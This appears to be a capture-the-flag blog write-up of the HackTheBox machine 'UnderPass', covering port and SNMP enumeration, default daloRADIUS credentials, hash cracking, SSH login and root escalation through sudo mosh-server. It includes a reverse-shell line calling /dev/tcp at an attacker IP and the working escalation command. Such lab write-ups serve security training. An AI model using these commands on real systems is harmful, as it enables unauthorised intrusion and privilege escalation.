---
title: HackTheBox -UnderPass
author: Bonface
date: 2025-04-11 00:00:00 +0000
categories:
  - HackTheBox
  - Machines
tags:
  - HackTheBox
  - linux
  - nmap
  - web
  - snmp
image:
  path: /assets/img/HTB/Machines/underpass/UnderPass.png
  alt: underpass.htb
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/1670709"></script> </div>

---
**Underpass** is an easy-rated Linux machine that starts with a default Apache Ubuntu page on port 80. Further enumeration reveals an SNMP service running on UDP port 161, which discloses that the box is hosting **daloRADIUS**. By navigating through the application and using default credentials, access is gained to the operators' panel, where a user hash for `svcMosh` is discovered and cracked. With the obtained password, SSH access is achieved. Privilege escalation is possible due to misconfigured `sudo` permissions allowing `svcMosh` to execute `mosh-server` as root, ultimately leading to full system compromise.


# Enumeration
## port scan

We start off with a typical nmap scan to identify the open ports.  
```bash
sudo nmap --min-rate 10000 10.10.11.48
...[snip]...

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

we have two open tcp ports lets now use the nmap scripts for further enumeration.  
```bash
nmap -sC -sV -p22,80 -vv 10.10.11.48 -o nmap/scan1
...[snip]...

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Now lets scan for open udp ports using the `-sU` flag on nmap.  
```nmap
nmap -sU -vv 10.10.11.48 -o nmap/udpscan1 --min-rate 10000
...[snip]...

PORT      STATE  SERVICE         REASON
161/udp   open   snmp            udp-response ttl 63
623/udp   closed asf-rmcp        port-unreach ttl 63
18818/udp closed unknown         port-unreach ttl 63
21576/udp closed unknown         port-unreach ttl 63
21655/udp closed unknown         port-unreach ttl 63
24279/udp closed unknown         port-unreach ttl 63
32780/udp closed sometimes-rpc24 port-unreach ttl 63
32815/udp closed unknown         port-unreach ttl 63
49204/udp closed unknown         port-unreach ttl 63

```

From the scans we have 3 open ports(2 Tcp and 1 Udp).  
The service running on port 22 is `ssh` while port 80 is `http`.  
On the `udp` port we have `snmp`.  

## snmp Enumeration

```bash
snmp-check 10.10.11.48
...[snip]...

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 06:21:14.20
  Uptime system                 : 06:21:02.86
  System date                   : 2025-4-11 16:35:52.0


```

We get a user `steve@underpass.htb` and with this will add `underpass.htb` to etc hosts.  
From the `Hostname` find that `UnDerPass.htb is the only daloradius server in the basin!`  
[daloRADIUS](https://github.com/lirantal/daloradius) is an advanced RADIUS web management application for managing hotspots and general-purpose ISP deployments.From the repository we get the directory structure.  

## Web Enumeration(80)
Visiting the site we get  Apache2 Default Page.  
![image](https://gist.github.com/user-attachments/assets/89743026-f8fc-4de6-886f-4e88c05f5fa2)

Lets also visit `daloradius` ,  since the page does not load we can run a directory scan using `feroxbuster`   
```bash
feroxbuster -u http://underpass.htb/daloradius

...[snip]...

200 http://underpass.htb/daloradius/doc/install/INSTALL
200 http://underpass.htb/daloradius/LICENSE

```

The scan has lots of `301` but we have the outstanding two.  

**`http://underpass.htb/daloradius/doc/install/INSTALL`**  
```
...[snip]...
  daloRADIUS version 0.9 stable release
 by Liran Tal <liran.tal@gmail.com>
 =========================================


...[snip]...
 5. INSTALLATION COMPLETE
 ------------------------
    Surf to http://yourip/daloradius
    Login:
		username: administrator
		password: radius

    Notice: don't forget to change the default password in the Configuration -> Operators page
			don't forget to also REMOVE completely or rename to some random undetected name the update.php script!
```

We now have the version that we can use to search for an exploit and the default   credentials:
	`username` : `administrator`
	`password` : `radius`  
All we have to do is search for a login page. We can fuzz the application again or just search for the file in the github repository, to get `https://github.com/lirantal/daloradius/blob/master/app/users/login.php`
thus in our site will be `http://underpass.htb/daloradius/app/users/login.php`
![image](https://gist.github.com/user-attachments/assets/867651b6-5427-4018-aef6-6f2eb2eba347)

The default `creds dont` work on this page lets move on to the other login page we saw in : `http://underpass.htb/daloradius/app/operators/login.php` 
![image](https://gist.github.com/user-attachments/assets/9bf2e998-2412-40da-881e-3baee0536255)
Logged in, now lets poke around and see what we have.  
![image](https://gist.github.com/user-attachments/assets/d3bbeb35-471e-4541-96c1-67c96aca21f7)

we have:
	`username` : `svcMosh`
	`pass_hash` : `412DD4759978ACFCC81DEAB01B382403`
	`password` : `...`

With this we can use `Hashcat` to crack the password but also you can crack using some online tool like [crackstation](https://crackstation.net/).  
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --username --show
svcMosh:412dd4759978acfcc81deab01b382403:underwaterfriends
```

## Foothold
We had ssh running on port 22 and now that we have valid user and password why not try logging.  
	`username` : `svcMosh`
	`password` : `underwaterfriends`

```bash
ssh svcMosh@underpass.htb
```


# Priv_Esc
Since we have the password we start off with `sudo -l` to lists the commands **we are allowed to run with `sudo`** without providing a full shell.  
```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
svcMosh@underpass:~$ 

```

We can run `/usr/bin/mosh-server` **as root**   
**Mosh** (Mobile Shell) is usually used to provide a more stable remote shell experience over unreliable networks.  
```bash
svcMosh@underpass:~$ mosh 
Usage: /usr/bin/mosh [options] [--] [user@]host [command...]
        --client=PATH        mosh client on local machine
                                (default: "mosh-client")
        --server=COMMAND     mosh server on remote machine
                                (default: "mosh-server")

```

we can execute commands with  mosh-server, lets get a reverse shell as root.  
```bash
svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server" bash -i >& /dev/tcp/10.10.16.20/1337 0>&1
svcMosh@underpass:~$ 

```

I keep getting errors with that but here is one that works:
```
svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server" localhost
svcMosh@underpass:~$ 

...[snip]...

root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# whoami
root
root@underpass:~# ls
root.txt
root@underpass:~# 

```

# Reference
- https://medium.com/@yashpawar1199/comprehensive-guide-to-snmp-protocol-vulnerabilities-and-pentesting-1490ee0dd665
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html?highlight=snmp#1611621016110162udp---pentesting-snmp


